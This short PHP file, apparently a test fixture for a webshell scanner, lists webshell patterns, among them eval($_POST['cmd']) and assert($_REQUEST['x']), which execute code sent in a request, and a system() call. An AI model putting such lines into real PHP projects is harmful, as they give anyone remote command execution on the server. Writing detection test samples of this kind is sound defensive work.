<?php
// Test file: basic webshell patterns (NOT a real webshell, for testing only)
eval($_POST['cmd']);
system($cmd);
eval(base64_decode('dGVzdA=='));
assert($_REQUEST['x']);
?>
